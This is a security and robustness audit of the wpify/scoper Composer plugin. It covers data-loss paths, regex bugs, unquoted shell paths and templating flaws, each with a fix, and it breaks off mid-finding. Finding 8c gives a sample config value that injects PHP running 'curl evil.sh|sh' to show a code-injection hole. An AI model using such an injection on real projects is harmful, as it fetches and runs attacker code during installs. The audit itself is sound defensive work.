# wpify/scoper — Bugs & Robustness Audit

Scope: `src/Plugin.php`, `scripts/postinstall.php`, `bin/wpify-scoper`, `config/scoper.inc.php`,
`config/scoper.config.php`, `scripts/extract-symbols.php`. `sources/` and `vendor/` excluded.

Every finding below was verified by reading the code and, where noted, by executing the exact
expression against real data from this repository. Findings I could not fully confirm are
explicitly labelled **UNCONFIRMED**.

---

## Runtime pipeline (as verified)

1. `Plugin::activate()` (`src/Plugin.php:51`) reads `extra.wpify-scoper`, computes `folder`,
   `prefix`, `globals`, `composerjson`, `composerlock` and a **one-shot random temp dir**
   `getcwd()/tmp-XXXXXXXXXX`.
2. `Plugin::execute()` (`src/Plugin.php:116`) is subscribed to `post-install-cmd` /
   `post-update-cmd` (`src/Plugin.php:44`). It:
   - builds `$temp/source`, `$temp/destination`,
   - writes `$temp/scoper.inc.php` + `$temp/scoper.config.php` (`createScoperConfig()`),
   - templates `scripts/postinstall.php` into `$temp/postinstall.php` via `str_replace` of
     `%%placeholder%%` tokens (`src/Plugin.php:148-157`),
   - writes `$temp/source/composer.json` from the user's `composer-deps.json`, injecting a
     `post-install-cmd`/`post-update-cmd` script array of three shell commands
     (`src/Plugin.php:169-173`),
   - runs a **nested in-process Composer** `install`/`update` in `$temp/source`
     (`runInstall()`, `src/Plugin.php:290`).
3. The nested Composer runs the three scripts: php-scoper → `dump-autoload --optimize` →
   `php $temp/postinstall.php`.
4. `postinstall.php` rewrites `autoload_static.php` and `scoper-autoload.php`, copies the lock
   back, `remove($deps)` then `rename($destination/vendor, $deps)`, then `remove($temp)`.

---

## Severity summary

| # | Finding | Sev | Effort |
|---|---|---|---|
| 1 | `remove($deps)` before `rename()` — unconditional data loss window | **Critical** | S |
| 2 | `remove()` follows symlinks — deletes path-repository sources outside the temp dir | **Critical** | S |
| 3 | `autoload_static.php` regex corrupts unqualified classmap keys | **High** | M |
| 4 | `--no-dev` is unreachable dead code — dev deps always scoped & shipped | **High** | M |
| 5 | Missing `exclude-classes` / `exclude-namespaces` → fatal `TypeError` in the patcher | **High** | S |
| 6 | Malformed `composer-deps.json` → fatal "assign property on null" | **High** | S |
| 7 | Unquoted php-scoper path — breaks on any project path containing a space | **High** | S |
| 8 | `%%placeholder%%` templating into single-quoted PHP — parse errors / code injection | **High** | M |
| 9 | Unchecked `file_get_contents` → `preg_replace(false)` truncates autoload files to empty | **High** | S |
| 10 | `composerlock` derivation can alias `composerjson` → user's config file destroyed | High | S |
| 11 | `realpath()` of php-scoper unchecked → silently broken script command | Medium | S |
| 12 | Nested-install exit code discarded — failures reported as success | Medium | S |
| 13 | `prefix` sanitising regex `/[[a-zA-Z0-9]+]/` does not do what it looks like | Medium | S |
| 14 | Temp dir: weak randomness, project-dir pollution, never cleaned on failure | Medium | M |
| 15 | Patcher rebuilds a 3,392-needle `str_replace` per file (~4.7 ms/file) | Medium | M |
| 16 | `path()` collapses only one doubled separator; mangles absolute/Windows paths | Medium | S |
| 17 | `getCapabilities()` is dead code — `Capable` not implemented | Medium | S |
| 18 | Empty `prefix` → silent no-op, no diagnostic | Medium | S |
| 19 | `require_once` in `createScoperConfig()` returns `true` on second include → `exit` | Medium | S |
| 20 | `array_merge_recursive` never de-duplicated on the plugin side | Low | S |
| 21 | `symbols/plugin-update-checker.php` uses `expose-classes`, contradicted downstream | Low | S |
| 22 | `autorun` strict `=== false` rejects `0`/`"false"` | Low | S |
| 23 | Unchecked `mkdir`/`copy`/`file_put_contents`/`json_encode` throughout | Low–Med | M |
| 24 | `bin/wpify-scoper`: `NullIO`, no exit code, ignores extra argv | Low | S |

---

## 1. `remove($deps)` executes before `rename()` — unconditional data-loss window

**Location:** `scripts/postinstall.php:62-63`

```php
remove( $deps );
rename( path( $destination, 'vendor' ), $deps );
```

**Problem.** The user's existing `deps/` directory is destroyed *first*, and only then is the
new one moved into place. Between those two statements the project has no dependencies at all.
`rename()`'s return value is not checked, so a failure is silent.

**Reproducing scenarios (all concrete):**

- **Cross-device rename.** `rename()` fails with `EXDEV` when source and destination are on
  different filesystems. This is reachable today: `extra.wpify-scoper.temp` and
  `extra.wpify-scoper.folder` are independently configurable (`src/Plugin.php:65-88`), so a user
  who points `temp` at a RAM disk / different volume (`"temp": "/tmp/scoper"` — note `path()`
  will actually mangle that, see #16) or who has `deps/` on a mounted volume gets:
  `deps/` deleted → `rename()` returns `false` → warning printed → script continues → temp dir
  removed at line 67 → **the scoped vendor is gone and `deps/` no longer exists**. The build
  reports success (see #12).
- **Docker / bind-mount layouts.** A bind-mounted `deps/` inside a container is a different
  device from the project temp dir in many setups — same outcome.
- **Interrupt.** Ctrl-C, OOM kill or a CI timeout landing between line 62 and 63 leaves the
  project with no `deps/`. Recoverable only by re-running, which is fine — but see #2 for the
  non-recoverable variant.
- **Windows.** `rename()` fails if any file under `deps/` is open (editor, IDE indexer,
  antivirus, a running PHP-FPM worker). Same silent loss.

**Fix.** Rename into place atomically, or at minimum verify before destroying:

```php
$new = path( $destination, 'vendor' );
$backup = $deps . '.bak-' . getmypid();

if ( ! is_dir( $new ) ) {
    fwrite( STDERR, "wpify-scoper: scoped vendor not found at {$new}\n" );
    exit( 1 );
}

if ( file_exists( $deps ) && ! rename( $deps, $backup ) ) {
    fwrite( STDERR, "wpify-scoper: cannot move existing {$deps} aside\n" );
    exit( 1 );
}

if ( ! rename( $new, $deps ) ) {
    // put the old one back
    if ( file_exists( $backup ) ) {
        rename( $backup, $deps );
    }
    fwrite( STDERR, "wpify-scoper: failed to move scoped vendor into {$deps}\n" );
    exit( 1 );
}

remove( $backup );
```

If cross-device support is wanted, fall back to a recursive copy + verify + delete when
`rename()` fails with `EXDEV`.

**Benefit.** No window in which the project has no dependencies; failures are loud and
recoverable.
**Downside.** Momentarily needs disk space for both the old and new tree (already true for the
temp tree). A few more lines of code.
**Severity:** Critical. **Effort:** S.

---

## 2. `remove()` follows symlinks — deletes files outside the tree it is asked to delete

**Location:** `scripts/postinstall.php:2-22`

```php
function remove( $src ) {
    if ( is_dir( $src ) ) {
        $dir = opendir( $src );
        while ( false !== ( $file = readdir( $dir ) ) ) { ... }
        rmdir( $src );
    } elseif ( is_file( $src ) ) {
        unlink( $src );
    }
}
```

`is_dir()` and `is_file()` both **follow symlinks**. There is no `is_link()` guard anywhere.

**Reproducing scenario (confirmed reachable).** Composer's `path` repository type symlinks
packages into `vendor/` by default (`"options": {"symlink": true}` is the default when the
filesystem supports it). A user whose `composer-deps.json` contains:

```json
{
  "repositories": [ { "type": "path", "url": "../my-shared-library" } ],
  "require": { "acme/my-shared-library": "@dev" }
}
```

gets `$temp/source/vendor/acme/my-shared-library` as a **symlink to `../my-shared-library`**.
`$temp/source/vendor` is *not* renamed away (only `$destination/vendor` is), so it is still
present when line 67 runs:

```php
remove( $temp );
```

`remove()` descends through the symlink and `unlink()`s every file in the developer's actual
`../my-shared-library` working copy, then `rmdir()`s its directories. **Uncommitted work in a
sibling package is destroyed.**

Second reachable variant: `$deps` itself being a symlink (a common layout — `deps` symlinked to
a shared location, or the whole plugin directory symlinked into a WP install). `remove($deps)`
at line 62 then wipes the *target*, and `rename()` at line 63 replaces the symlink, silently
changing the project layout.

Third: any dependency that legitimately ships a symlink inside its own tree.

**Fix.** Guard on `is_link()` before recursing, and use `lstat`-based checks:

```php
function remove( $src ) {
    if ( is_link( $src ) ) {
        // never follow: remove the link itself
        if ( ! @unlink( $src ) ) {
            @rmdir( $src ); // Windows dir junctions
        }
        return;
    }

    if ( is_dir( $src ) ) { ... }
}
```

Also add `readdir` / `unlink` / `rmdir` failure handling — a single unremovable file currently
makes `rmdir()` fail silently and leaves a partial tree behind (see #14).

**Benefit.** Eliminates the only path in the codebase that can destroy files outside the
project's own temp/deps directories.
**Downside.** None. A dangling symlink left in `deps/` after the change is harmless.
**Severity:** Critical. **Effort:** S.

---

## 3. The `autoload_static.php` rewrite corrupts unqualified classmap keys

**Location:** `scripts/postinstall.php:39-46`

```php
$autoload_static = preg_replace(
    "/'([[:alnum:]]+)'\s*=>\s*([a-zA-Z0-9 .'\"\/\-_]+),/",
    "'" . $prefix . "\\1' => \\2,",
    $autoload_static
);
```

**Intent.** Composer's optimized autoloader stores `$files` under md5 identifiers and
de-duplicates through `$GLOBALS['__composer_autoload_files'][$fileIdentifier]`. If the scoped
vendor reuses the host project's identifiers, its bootstrap files are skipped. Prefixing the
identifiers is the correct fix, and the regex does achieve it.

**Bug.** The pattern is applied to the *whole file* and is not restricted to the `$files` array.
Any `$classMap` entry whose key is a single unqualified `[A-Za-z0-9]+` class name also matches.

**Verified.** Running the exact expression against this repository's own
`vendor/composer/autoload_static.php` changed **30 lines**: the 16 intended `$files` entries and
**14 unintended `$classMap` entries**:

```
- 'Attribute'  => __DIR__ . '/..' . '/symfony/polyfill-php80/Resources/stubs/Attribute.php',
+ 'mydepsnamespaceAttribute' => __DIR__ . '/..' . '/symfony/polyfill-php80/Resources/stubs/Attribute.php',

- 'Normalizer' => __DIR__ . '/..' . '/symfony/polyfill-intl-normalizer/Resources/stubs/Normalizer.php',
+ 'mydepsnamespaceNormalizer' => ...
```

Also hit: `CURLStringFile`, `DelayedTargetValidation`, `Deprecated`, `JsonException`,
`NoDiscard`, `PhpToken`, `ReflectionConstant`, `Stringable`, `UnhandledMatchError`, `ValueError`.

A corrupted key means the class is **no longer autoloadable from the scoped vendor**.

**Which entries actually survive into a scoped classmap.** php-scoper leaves symbols it
classifies as *internal* (PHP core + extension symbols, sourced from the PhpStormStubs maps)
unprefixed. Class names it does prefix become `Prefix\Foo`, which contains backslashes and
therefore cannot match `[[:alnum:]]+`. So the victims are exactly the classes that stay global:

- **Polyfill stubs.** `symfony/polyfill-intl-normalizer` ships a global `Normalizer` stub; this
  is a transitive dependency of a large fraction of Composer packages. On a host **without
  ext-intl**, the class is now unreachable → `Error: Class "Normalizer" not found` at runtime.
  Same shape for `symfony/polyfill-php7x` stubs on older runtimes.
- **Explicitly excluded WordPress/WooCommerce classes.** Of the 1,219 `exclude-classes` entries
  in `symbols/*.php`, **49 are pure alnum** and would be corrupted if a dependency declared
  them: `PclZip`, `wpdb`, `getID3`, `Walker`, `WP`, `SimplePie`, `AtomParser`, `PO`, `MO`,
  `Translations`, `PasswordHash`, `Snoopy`, `SodiumException`, `Requests`, `POP3`,
  `WooCommerce`, `ActionScheduler`, `CronExpression`, `MagpieRSS`, `RSSCache`, `ftp`, … .

**UNCONFIRMED:** I did not run a full scoping pass end-to-end, so I could not observe a scoped
`autoload_static.php` directly. The reasoning about which keys php-scoper leaves unprefixed is
inference from php-scoper's documented internal-symbol handling, not observation. The regex
behaviour itself *is* confirmed against a real Composer-generated file.

**Fix.** Rewrite only the `$files` array, not the whole file. Either slice the block first:

```php
$autoload_static = preg_replace_callback(
    '/(public static \$files = array \()(.*?)(^\s*\);)/ms',
    static function ( array $m ) use ( $prefix ) {
        $body = preg_replace( "/^(\s*)'([0-9a-f]{32})'/m", "$1'" . $prefix . "$2'", $m[2] );
        return $m[1] . $body . $m[3];
    },
    $autoload_static
);
```

or, far more robustly, drop the regex entirely and set `"config": {"autoloader-suffix": $prefix}`
in the generated `$source/composer.json` — Composer then namespaces the whole static-init class,
and additionally use a distinct `$files` identifier salt. (Note: `autoloader-suffix` alone does
*not* change the `$files` md5 keys, so the `$files` prefixing is still needed; but scoping the
edit to the `$files` block is sufficient and minimal.)

**Benefit.** Removes an entire class of "class not found only on some hosts" bugs that are
extremely hard to diagnose in shipped WordPress plugins.
**Downside.** The block-scoped regex is tied to Composer's generated formatting; if Composer
changes it, the `$files` prefixing silently stops happening (add a `preg_match` assertion + hard
failure when the `$files` block is not found).
**Severity:** High. **Effort:** M.

---

## 4. `--no-dev` is unreachable dead code — dev dependencies are always scoped and shipped

**Locations:** `src/Plugin.php:19,21` (constants), `src/Plugin.php:191-197`,
`src/Plugin.php:104-108` (`getCapabilities`), `bin/wpify-scoper:14-20`

```php
$useDevDependencies = true;

if ( $event->getName() === self::SCOPER_UPDATE_NO_DEV_CMD || $event->getName() === self::SCOPER_INSTALL_NO_DEV_CMD ) {
    $useDevDependencies = false;
}
```

`SCOPER_INSTALL_NO_DEV_CMD` / `SCOPER_UPDATE_NO_DEV_CMD` are never produced by anything:

- `bin/wpify-scoper` maps only `install` → `SCOPER_INSTALL_CMD` and `update` →
  `SCOPER_UPDATE_CMD`. Any other argv value prints usage and exits.
- `getCapabilities()` would register a `CommandProvider`, but **`Plugin` does not implement
  `Composer\Plugin\Capable`** (`src/Plugin.php:16` — verified: only `PluginInterface` and
  `EventSubscriberInterface`). Composer's `PluginManager` calls `getCapabilities()` only on
  `Capable` plugins, so the method is never invoked. Even if it were, it maps
  `CommandProvider::class => self::class` and `Plugin` does not implement `CommandProvider`,
  which Composer rejects with a `RuntimeException`.

**Consequence.** `$useDevDependencies` is always `true`. The nested install
(`src/Plugin.php:290-305`) always passes `--no-dev => false`, so **every `require-dev` entry of
`composer-deps.json` is installed, scoped, and moved into the shipped `deps/` folder** — even
when the outer command was `composer install --no-dev` in a production build or release
pipeline. This bloats and potentially leaks development tooling into distributed WordPress
plugins.

**Fix (two parts).**

1. Propagate the outer dev mode. `Composer\Script\Event::isDevMode()` reports whether the
   triggering install/update ran with dev dependencies:

   ```php
   $useDevDependencies = $event->isDevMode();
   ```

   (`bin/wpify-scoper` constructs `new Event($command, $composer, $io)` with `$devMode`
   defaulting to `false`, which is the right default for a manual scoping run; pass it
   explicitly based on a `--no-dev` flag.)
2. Either delete the two unused constants and `getCapabilities()`, or make them real:
   `implements Capable`, a separate class implementing `CommandProvider`, and a
   `--no-dev` option on `bin/wpify-scoper`.

**Benefit.** Correct production builds; smaller shipped artifacts; removes misleading dead code.
**Downside.** Behaviour change for existing users who (unknowingly) relied on dev deps ending up
in `deps/`. Worth a note in the changelog.
**Severity:** High. **Effort:** M.

---

## 5. Missing `exclude-classes` / `exclude-namespaces` → fatal `TypeError` in the patcher

**Location:** `config/scoper.inc.php:79-101`

```php
usort( $config['exclude-classes'], function ( $a, $b ) { ... } );
...
foreach ( $config['exclude-namespaces'] as $symbol ) { ... }
```

`$config` here is `$temp/scoper.config.php`, written by `Plugin::createScoperConfig()`
(`src/Plugin.php:263`). That array only gains `exclude-classes` / `exclude-namespaces` if one of
the symbol files merged at `src/Plugin.php:223-256` supplies them.

**Reproducing scenarios (verified against the actual symbol files):**

- `"globals": []` — no symbol file is merged. `$config` is
  `['prefix','source','destination','exclude-constants']`. First patched file →
  `Warning: Undefined array key "exclude-classes"` → `usort(null, …)` →
  **`TypeError: usort(): Argument #1 ($array) must be of type array, null given`** (confirmed by
  execution). php-scoper aborts, composer aborts the script chain, the temp dir is orphaned.
- `"globals": ["plugin-update-checker"]` — verified: `symbols/plugin-update-checker.php`
  contains **only** `expose-classes` (33 entries). No `exclude-classes`, no
  `exclude-namespaces` → identical fatal.

Note `"globals": []` is not exotic: it is the natural configuration for scoping a non-WordPress
dependency set, and the README documents `globals` as optional.

**Fix.** Defensive defaults at the point of use, plus normalisation at the point of generation:

```php
// config/scoper.inc.php
$excludeClasses    = $config['exclude-classes'] ?? array();
$excludeNamespaces = $config['exclude-namespaces'] ?? array();
```

and in `Plugin::createScoperConfig()`, seed the keys:

```php
$config += array(
    'exclude-classes'    => array(),
    'exclude-namespaces' => array(),
    'exclude-functions'  => array(),
);
```

**Benefit.** `globals: []` and single-global configurations work.
**Downside.** None.
**Severity:** High. **Effort:** S.

---

## 6. Malformed / unreadable `composer-deps.json` → fatal "assign property on null"

**Location:** `src/Plugin.php:134-146`

```php
$composerJson = json_decode( file_get_contents( ... ), false );
...
if ( empty( $composerJson->scripts ) ) {
    $composerJson->scripts = (object) array();
}
```

No `json_last_error()` check, no `file_get_contents()` check.

**Reproducing scenario.** A user edits `composer-deps.json` and leaves a trailing comma or an
unclosed brace, then runs `composer update`. `json_decode` returns `null`;
`empty($composerJson->scripts)` emits `Warning: Attempt to read property "scripts" on null` and
evaluates true; the assignment then throws
**`Error: Attempt to assign property "scripts" on null`** (confirmed by execution). The user
sees a raw PHP fatal from inside a Composer plugin, with no indication that their
`composer-deps.json` is the culprit. Same outcome if the file is unreadable (permissions).

Related: if the decoded value is a scalar (`composer-deps.json` containing `"hello"` or `[]`),
`$composerJson->scripts` on a string/array is likewise fatal or silently wrong.

**Fix.**

```php
$path = $this->path( getcwd(), $this->composerjson );
$raw  = file_get_contents( $path );

if ( false === $raw ) {
    throw new \RuntimeException( sprintf( 'wpify-scoper: cannot read %s', $path ) );
}

$composerJson = json_decode( $raw, false );

if ( ! $composerJson instanceof \stdClass ) {
    throw new \RuntimeException( sprintf(
        'wpify-scoper: %s is not valid JSON (%s)', $path, json_last_error_msg()
    ) );
}
```

Composer catches exceptions from script handlers and prints them cleanly.

**Benefit.** Actionable error instead of a PHP fatal.
**Downside.** None.
**Severity:** High. **Effort:** S.

---

## 7. Unquoted php-scoper path — breaks on any project path containing a space

**Location:** `src/Plugin.php:167-173`

```php
$phpscoper = realpath( __DIR__ . '/../../php-scoper/bin/php-scoper.phar' );

$composerJson->scripts->{$scriptName} = array(
    $phpscoper . ' add-prefix --output-dir="' . $destination . '" --force --config="' . $scoperConfig . '"',
    'composer dump-autoload --working-dir="' . $destination . '" --optimize',
    'php "' . $postinstallPath . '"',
);
```

The `--output-dir`, `--config` and `php "…"` arguments are quoted; **`$phpscoper` itself is
not**.

**Reproducing scenario.** A macOS user with the project at
`/Users/Jane Doe/Sites/my-plugin` runs `composer update`. Composer executes the script through
a shell, which splits on the space:

```
sh: /Users/Jane: No such file or directory
```

Windows (`C:\Program Files\…`, or any user profile with a space) has the same failure. This is
common enough on macOS and Windows to be a first-run blocker.

Secondary, Windows-specific: the phar is invoked directly and relies on its `#!/usr/bin/env php`
shebang plus the executable bit (verified present: `-rwxr-xr-x php-scoper.phar`). Windows has no
shebang handling — `.phar` is not an executable extension by default, so the command fails
regardless of quoting.

**Fix.**

```php
$php       = ( new PhpExecutableFinder() )->find() ?: 'php';
$phpscoper = realpath( __DIR__ . '/../../php-scoper/bin/php-scoper.phar' );

$composerJson->scripts->{$scriptName} = array(
    sprintf( '%s %s add-prefix --output-dir=%s --force --config=%s',
        ProcessExecutor::escape( $php ),
        ProcessExecutor::escape( $phpscoper ),
        ProcessExecutor::escape( $destination ),
        ProcessExecutor::escape( $scoperConfig )
    ),
    ...
);
```

`Composer\Util\ProcessExecutor::escape()` and `Symfony\Component\Process\PhpExecutableFinder`
are both already available (Composer is a hard dependency). Invoking via `php <phar>` also fixes
Windows.

**Benefit.** Works for every path; works on Windows; uses the same PHP binary Composer runs
under instead of whatever `php` resolves to on `PATH`.
**Downside.** None.
**Severity:** High. **Effort:** S.

---

## 8. `%%placeholder%%` templating injects raw values into single-quoted PHP literals

**Location:** `src/Plugin.php:148-157` → `scripts/postinstall.php:30-36`

```php
$postinstall = str_replace( '%%source%%', $source, $postinstall );
...
$postinstall = str_replace( '%%prefix%%', $this->prefix, $postinstall );
```

Template side:

```php
$source        = '%%source%%';
$cwd           = '%%cwd%%';
$deps          = '%%deps%%';
$prefix        = strtolower( preg_replace( "/[[a-zA-Z0-9]+]/", '', '%%prefix%%' ) );
```

Values are spliced into **single-quoted PHP string literals** with no escaping. In a
single-quoted literal only `\'` and `\\` are special, which means:

**8a — Apostrophe in the project path → parse error (realistic).**
A user at `/Users/o'brien/sites/plugin` gets:

```php
$cwd = '/Users/o'brien/sites/plugin';
```

→ `PHP Parse error: syntax error, unexpected identifier "brien"`. The scoping step fails after
php-scoper and `dump-autoload` have already run; the temp dir is orphaned. Apostrophes in home
directory names are common enough to hit.

**8b — Windows path ending in a separator → unterminated string (realistic).**
`"folder": "deps\\"` in `composer.json` (a natural thing to write on Windows) yields
`$deps = 'C:\proj\deps\';` → the `\'` escapes the quote → unterminated string, parse error.
Similarly, `%%cwd%%` at a drive root (`C:\`) breaks.

Note: ordinary Windows paths *do* survive, because `\U`, `\d`, `\p`, `\t` etc. are not escape
sequences in single quotes. The failure is specifically about a **trailing backslash** and about
**embedded apostrophes**.

**8c — Code injection via `prefix` / `folder` / `temp`.**

```json
{ "extra": { "wpify-scoper": { "prefix": "Foo'; system('curl evil.sh|sh'); //" } } }
```

produces executable PHP in `$temp/postinstall.php`. The attacker needs write access to
`composer.json`, which mostly means they already win — but this matters for the realistic case
of **installing a third-party package/template whose `composer.json` you did not audit**, and it
turns a config-file read into arbitrary code execution during `composer install`. It also means
the config values are not validated at all.

**8d — Backslash consumption in the `%%prefix%%` replacement.** `str_replace` is literal, so a
prefix is inserted verbatim; but `postinstall.php:43` then uses `$prefix` inside a *preg
replacement string* (`"'" . $prefix . "\\1' => \\2,"`). A prefix ending in a digit-adjacent
backslash would be reinterpreted as a backreference. Low likelihood, but it is the same class of
bug.

**Fix.** Stop templating source code. Two good options:

- **Preferred:** write the values as a data file and read them:
  ```php
  // Plugin::execute()
  $this->createJson( $this->path( $this->tempDir, 'postinstall.json' ), array(
      'source' => $source, 'destination' => $destination, 'cwd' => getcwd(),
      'composer_lock' => $this->composerlock, 'deps' => $this->folder,
      'temp' => $this->tempDir, 'prefix' => $this->prefix,
  ) );
  ```
  and in `postinstall.php`:
  ```php
  $cfg = json_decode( file_get_contents( __DIR__ . '/postinstall.json' ), true );
  ```
  `postinstall.php` then needs no templating at all and can be copied verbatim (or even executed
  in place from the package, with the JSON path passed as `argv[1]`).
- **Minimal:** replace each `str_replace` with `var_export($value, true)` substitution into an
  unquoted slot (`$source = %%source%%;`), which escapes correctly for any string.

Independently, **validate `prefix`** in `activate()`:

```php
if ( ! preg_match( '/^[A-Za-z_\x80-\xff][A-Za-z0-9_\x80-\xff]*(\\\\[A-Za-z_\x80-\xff][A-Za-z0-9_\x80-\xff]*)*$/', $prefix ) ) {
    throw new \RuntimeException( 'wpify-scoper: extra.wpify-scoper.prefix must be a valid PHP namespace.' );
}
```

**Benefit.** Removes a code-injection vector and two realistic parse-error classes; makes
`postinstall.php` independently testable (it currently cannot be run or linted standalone,
because `%%source%%` is not valid content).
**Downside.** One extra file in the temp dir. Slightly larger refactor than a one-liner.
**Severity:** High (Critical if you count 8c as a security boundary). **Effort:** M.

---

## 9. Unchecked `file_get_contents` → `preg_replace(false)` empties the autoload files

**Location:** `scripts/postinstall.php:39-53`

```php
$autoload_static = file_get_contents( $autoload_static_path );
$autoload_static = preg_replace( ..., $autoload_static );
file_put_contents( $autoload_static_path, $autoload_static );

$scoper_autoload = file_get_contents( $scoper_autoload_path );
$scoper_autoload = preg_replace( ..., $scoper_autoload );
file_put_contents( $scoper_autoload_path, $scoper_autoload );
```

If either file is missing, `file_get_contents()` returns `false` with a warning; `preg_replace()`
on `false` returns `''` (with a PHP 8.1 deprecation); `file_put_contents()` then **creates or
truncates the file to zero bytes**. The result is shipped into `deps/`.

`$destination/vendor/scoper-autoload.php` is the realistic case: php-scoper only emits it when
there is something to alias. A dependency set with no exposed symbols therefore produces an
empty `scoper-autoload.php` in `deps/vendor/`, and any user code doing
`require 'deps/vendor/scoper-autoload.php'` silently gets nothing (the README instructs users to
include the scoped autoload).

`preg_replace()` can also return `null` on PCRE failure (backtrack limit — plausible on
`autoload_static.php` for a very large classmap with the `.*?`-free but unanchored pattern),
which likewise truncates the file. **UNCONFIRMED:** I did not reproduce a PCRE backtrack limit
hit on a real file; the `false` path is confirmed by PHP semantics.

**Fix.**

```php
function rewrite( string $path, callable $fn ): void {
    if ( ! is_file( $path ) ) {
        return; // nothing to rewrite
    }

    $content = file_get_contents( $path );

    if ( false === $content ) {
        fwrite( STDERR, "wpify-scoper: cannot read {$path}\n" );
        exit( 1 );
    }

    $result = $fn( $content );

    if ( ! is_string( $result ) || '' === $result ) {
        fwrite( STDERR, "wpify-scoper: rewrite of {$path} failed (" . preg_last_error_msg() . ")\n" );
        exit( 1 );
    }

    if ( false === file_put_contents( $path, $result ) ) {
        fwrite( STDERR, "wpify-scoper: cannot write {$path}\n" );
        exit( 1 );
    }
}
```

**Benefit.** Never ships a truncated autoloader; missing optional files are handled explicitly.
**Downside.** None.
**Severity:** High. **Effort:** S.

---

## 10. `composerlock` derivation can alias `composerjson`, destroying the user's config file

**Location:** `src/Plugin.php:69-72` → `scripts/postinstall.php:57-58`

```php
$configValues['composerlock'] = preg_replace( '/\.json$/', '.lock', $extra['wpify-scoper']['composerjson'] );
```

If `composerjson` does not end in a lowercase `.json`, `preg_replace` returns it **unchanged**,
so `composerlock === composerjson`. Verified:

| `composerjson` | derived `composerlock` |
|---|---|
| `composer-deps.json` | `composer-deps.lock` |
| `deps.config` | `deps.config` |
| `a.JSON` | `a.JSON` |
| `x.json.dist` | `x.json.dist` |

Then in `postinstall.php`:

```php
remove( path( $cwd, $composer_lock ) );
copy( path( $destination, 'composer.lock' ), path( $cwd, $composer_lock ) );
```

**Reproducing scenario.** A user sets `"composerjson": "deps.json5"` (or `"scoped.config"`, or
uppercases the extension on a case-sensitive filesystem). First `composer update`:
`Plugin::execute()` reads their file fine, then `postinstall.php` **deletes it** and writes the
generated `composer.lock` over it. Their dependency declaration is gone; the next run creates an
empty `composer-deps.json`-equivalent (`src/Plugin.php:137-141`) and installs nothing.

**Fix.** Derive by replacing the actual extension and assert the result differs:

```php
$json = $extra['wpify-scoper']['composerjson'];
$lock = preg_replace( '/\.[^.\/\\\\]*$/', '.lock', $json );

if ( $lock === $json || '' === $lock ) {
    $lock = $json . '.lock';
}
```

Additionally assert `$this->composerlock !== $this->composerjson` in `execute()` and fail loudly
if a user explicitly configures them equal.

**Benefit.** Removes a silent data-loss path triggered by a documented config option.
**Downside.** None.
**Severity:** High (low likelihood × high impact). **Effort:** S.

---

## 11. `realpath()` of the php-scoper phar is unchecked

**Location:** `src/Plugin.php:167`

```php
$phpscoper = realpath( __DIR__ . '/../../php-scoper/bin/php-scoper.phar' );
```

`realpath()` returns `false` when the path does not exist. `false . ' add-prefix …'` yields
`" add-prefix --output-dir=…"` — a command starting with a space. The shell then tries to run
`add-prefix`, fails with `command not found`, composer aborts the script chain, and the user gets
no hint that php-scoper is missing.

**When it happens:** the hardcoded `../../php-scoper` assumes the installed layout
`vendor/wpify/scoper/src` → `vendor/wpify/php-scoper`. It is wrong for anyone running the plugin
from a git clone or a path repository, and it breaks with a non-default `vendor-dir`, with
`composer/installers` remapping, and if `wpify/php-scoper` ever changes its package name or
ships the binary elsewhere.

**Fix.** Resolve through Composer instead of guessing:

```php
$vendorDir  = $this->composer->getConfig()->get( 'vendor-dir' );
$phpscoper  = $this->path( $vendorDir, 'wpify', 'php-scoper', 'bin', 'php-scoper.phar' );

if ( ! is_file( $phpscoper ) ) {
    throw new \RuntimeException( sprintf(
        'wpify-scoper: php-scoper not found at %s. Is wpify/php-scoper installed?', $phpscoper
    ) );
}
```

**Benefit.** Correct in every layout; a clear error when it is genuinely missing.
**Downside.** None.
**Severity:** Medium. **Effort:** S.

---

## 12. The nested install's exit code is discarded — failures are reported as success

**Locations:** `src/Plugin.php:197`, `src/Plugin.php:290-305`, `bin/wpify-scoper:41`

```php
$this->runInstall( $source, $command, $useDevDependencies );   // return value dropped
```

`runInstall()` returns `Application::run()`'s exit code, which `execute()` ignores. `execute()`
returns `void`, and Composer's `EventDispatcher` treats a script-handler callable that neither
throws nor returns a non-zero value as success. `bin/wpify-scoper` likewise ends after
`$scoper->execute($fakeEvent)` with no `exit()`.

**Reproducing scenario.** `composer-deps.json` requires a package with an unsatisfiable
constraint, or a private repository the CI runner cannot authenticate to. The nested install
fails and prints its error to `ConsoleOutput`. `composer install` then **exits 0**. CI goes
green, `deps/` still contains the previous (or no) build, the temp dir is left behind, and the
release ships stale dependencies.

Same for `bin/wpify-scoper install` in a release script — always exits 0.

**Fix.**

```php
// Plugin::execute()
$exitCode = $this->runInstall( $source, $command, $useDevDependencies );

if ( 0 !== $exitCode ) {
    throw new \RuntimeException( sprintf(
        'wpify-scoper: nested composer %s failed with exit code %d.', $command, $exitCode
    ) );
}
```

and make `execute()` return the code, with `bin/wpify-scoper` doing `exit( $scoper->execute( $fakeEvent ) ?? 0 );`.

**Benefit.** CI actually fails when scoping fails; no stale `deps/` shipped.
**Downside.** Builds that currently "pass" while silently doing nothing will start failing —
which is the point, but it will surface pre-existing breakage.
**Severity:** Medium (High for anyone with a release pipeline). **Effort:** S.

---

## 13. The prefix-sanitising regex does not do what it appears to do

**Location:** `scripts/postinstall.php:36`

```php
$prefix = strtolower( preg_replace( "/[[a-zA-Z0-9]+]/", '', '%%prefix%%' ) );
```

Read carefully, the pattern is: character class `[[a-zA-Z0-9]` (i.e. **`[`, letters, digits**),
then `+`, then a **literal `]`**. It matches *"a run of bracket-or-alnum characters followed by a
closing bracket"*. It is almost certainly meant to be `/[^a-zA-Z0-9]+/` (strip everything that is
not alphanumeric).

**Verified behaviour:**

| input | output |
|---|---|
| `MyDepsNamespace` | `MyDepsNamespace` (no-op) |
| `My_Deps\Namespace` | `My_Deps\Namespace` (no-op) |
| `Foo[bar]Baz` | `Baz` |

**Consequences.**

- For every realistic prefix it is a **no-op**, so the effective value is just
  `strtolower($prefix)`. That happens to work for the `$files` identifier prefixing, so nothing
  is visibly broken today — which is exactly why the bug has survived.
- Non-alphanumeric characters are **not** stripped. A namespaced prefix such as
  `Acme\MyPlugin\Deps` yields `$prefix = 'acme\myplugin\deps'`, which is then spliced into a
  *preg replacement string* at line 43 (`"'" . $prefix . "\\1' => \\2,"`). Backslashes in a
  replacement string are significant: `\m`, `\d` are passed through, but a prefix whose
  backslash is followed by a digit becomes a backreference. It also produces odd but syntactically
  valid array keys like `'acme\myplugin\deps6e3fae…'`.
- If a prefix ever *does* contain brackets, an arbitrary chunk of it is deleted, changing the
  identifier namespace between runs.

**Fix.**

```php
